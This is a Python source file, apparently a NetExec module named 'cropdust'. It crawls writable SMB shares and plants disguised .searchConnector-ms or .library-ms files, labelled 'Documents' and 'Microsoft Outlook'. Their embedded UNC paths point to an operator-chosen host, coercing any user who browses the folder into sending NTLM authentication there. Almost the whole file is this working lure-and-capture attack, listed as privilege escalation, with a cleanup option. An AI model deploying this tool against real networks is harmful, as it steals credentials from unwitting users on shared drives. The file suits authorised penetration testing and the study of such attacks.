import ntpath
import tempfile


class CropDuster:
    def __init__(
        self,
        smb,
        logger,
        filename,
        scfile_path,
        url,
        cleanup,
        type,
        share,
        folders):

            
        self.smb = smb
        self.host = self.smb.conn.getRemoteHost()
        self.max_connection_attempts = 5
        self.logger = logger
        self.filename = filename
        self.scfile_path = scfile_path
        self.url = url
        self.cleanup = cleanup
        self.type = type
        self.share = share
        self.folders = folders

    
    def get_dirs(self, share, path="\\"):
        results = []
        items = self.smb.conn.listPath(share, path + "*")

        for item in items:
            name = item.get_longname()
            if name in ['.', '..'] or not item.is_directory():
                continue

            dir_path = path + name + "\\"
            results.append(dir_path)
            try:
                results.extend(self.get_dirs(share, dir_path))
            except Exception:
                continue

        return results


    def do_cropdust(self):
 
        all_dirs = []
        # if all folders on the share were chosen, get a recursive list of them
        if self.folders == "All":
            self.logger.display(f"Getting all accessible directories in {self.share}")
            all_dirs.append("\\")  # always include root
            all_dirs.extend(self.get_dirs(self.share))
        # otherwise, just set the all_dirs list to self.folders
        else:
            dir_path = f"{self.folders}\\"
            all_dirs.append(dir_path)
  
        for dir in all_dirs:
            # drop or clean
            extension = ".searchConnector-ms" if self.type == "search" else ".library-ms"
            file_name = self.filename + extension
            remote_path = ntpath.join(dir, file_name)
            #self.logger.display(f'{remote_path}')
            try:
                if self.cleanup:
                    self.smb.conn.deleteFile(self.share, remote_path)
                    self.logger.success(f"Cleaned: {self.share}{remote_path}")
                else:
                    with open(self.scfile_path, "rb") as scfile:
                        self.smb.conn.putFile(self.share, remote_path, scfile.read)
                        self.logger.success(f"Dropped: {self.share}{remote_path}")
            except Exception as e:
                if "0xc0000022 - STATUS_ACCESS_DENIED" in str(e):
                    self.logger.fail(f"{dir} not writable, skipping")
                    pass
                elif "0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                    self.logger.fail(f"{file_name} not found in {dir}, skipping")
                    pass
                else:
                    self.logger.fail(f"Error in {dir}: {e}")


class NXCModule:

    name = "cropdust"
    description = "Recursively or selectively drop a .searchConnector-ms/.library-ms file into folder(s) on writable shares. Has a cleanup function"
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = False
    category = CATEGORY.PRIVILEGE_ESCALATION


    def options(self, context, module_options):
        """
        Recursively drop a .searchConnector-ms/.library-ms file into folders on writable shares.

        SHARE               Specify a share to target
        URL                 URL in the dropped file to call back to, format is {HOST}@{PORT} - default is "microsoft.com@80"
        FOLDER              Specify a specific folder to write to - default is recursive
        FILENAME            Specify the filename used WITHOUT extension - default is "Documents"
        TYPE                Specify type of file to drop (search/library) - default is "search"
        CLEANUP             Clean up dropped files - default is False
        """
        
        # cleanup
        self.cleanup = False
        if "CLEANUP" in module_options:
            self.cleanup = bool(module_options["CLEANUP"])

        # url to point to in the dropped file
        self.url = "microsoft.com"
        if "URL" in module_options:
            self.url = str(module_options["URL"])

        # the name of the file
        self.filename = "Documents"
        if "FILENAME" in module_options:
            self.filename = str(module_options["FILENAME"])

        # chosen share
        self.share = None
        if "SHARE" in module_options:
            self.share = str(module_options["SHARE"])
        else:
            context.log.fail("SHARE name is required")
            quit()
            
        # chosen folder
        self.folders = "All"
        if "FOLDER" in module_options:
            self.folders = str(module_options["FOLDER"])
        
        # type
        self.type = "search"
        if "TYPE" in module_options:
            self.type = str(module_options["TYPE"])
        if self.type == "search":
            self.scfile_path = f"{self.filename}.searchConnector-ms"
            # if we aren't doing cleanup, create a local search connector file in temp directory
            if not self.cleanup:
                self.scfile_path = f"{tempfile.gettempdir()}/{self.filename}.searchConnector-ms"
                with open(self.scfile_path, "w") as scfile:
                    scfile.truncate(0)
                    scfile.write('<?xml version="1.0" encoding="UTF-8"?>')
                    scfile.write('<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">')
                    scfile.write("<description>Microsoft Outlook</description>")
                    scfile.write("<isSearchOnlyItem>false</isSearchOnlyItem>")
                    scfile.write("<includeInStartMenuScope>true</includeInStartMenuScope>")
                    scfile.write(f"<iconReference>\\\\{self.url}\\searchCon.ico</iconReference>")
                    scfile.write("<templateInfo>")
                    scfile.write("<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>")
                    scfile.write("</templateInfo>")
                    scfile.write("<simpleLocation>")
                    scfile.write(f"<url>\\\\{self.url}\\SearchOutlook</url>")
                    scfile.write("</simpleLocation>")
                    scfile.write("</searchConnectorDescription>")
        elif self.type == "library":
            self.scfile_path = f"{self.filename}.library-ms"
            # if we aren't doing cleanup, create a local search connector file in temp directory
            if not self.cleanup:
                self.scfile_path = f"{tempfile.gettempdir()}/{self.filename}.library-ms"
                with open(self.scfile_path, "w") as scfile:
                    scfile.truncate(0)
                    scfile.write('<?xml version="1.0" encoding="UTF-8"?>')
                    scfile.write('<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">')
                    scfile.write("<name>@windows.storage.dll,-34582</name>")
                    scfile.write("<version>6</version>")
                    scfile.write("<isLibraryPinned>true</isLibraryPinned>")
                    scfile.write(f"<iconReference>\\\\{self.url}\\libIcon.ico</iconReference>")
                    scfile.write("<templateInfo>")
                    scfile.write("<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>")
                    scfile.write("</templateInfo>")
                    scfile.write("<searchConnectorDescriptionList>")
                    scfile.write('<searchConnectorDescription>')
                    scfile.write(f"<isDefaultSaveLocation>true</isDefaultSaveLocation>")
                    scfile.write("<isSupported>false</isSupported>")
                    scfile.write("<simpleLocation>")
                    scfile.write(f"<url>\\\\{self.url}\\LibMicrosoft</url>")
                    scfile.write('</simpleLocation>')
                    scfile.write('</searchConnectorDescription>')
                    scfile.write('</searchConnectorDescriptionList>')
                    scfile.write('</libraryDescription>')


    def on_login(self, context, connection):

        context.log.display("Started cropduster module with the following options:")
        context.log.display(f"URL:      {self.url}")
        context.log.display(f"FILENAME: {self.filename}")
        context.log.display(f"SHARE:    {self.share}")
        context.log.display(f"FOLDER:   {self.folders}")
        context.log.display(f"TYPE:     {self.type}")
        context.log.display(f"CLEANUP:  {self.cleanup}")


        cropdust = CropDuster(
            connection,
            context.log,
            self.filename,
            self.scfile_path,
            self.url,
            self.cleanup,
            self.type,
            self.share,
            self.folders)

        cropdust.do_cropdust()
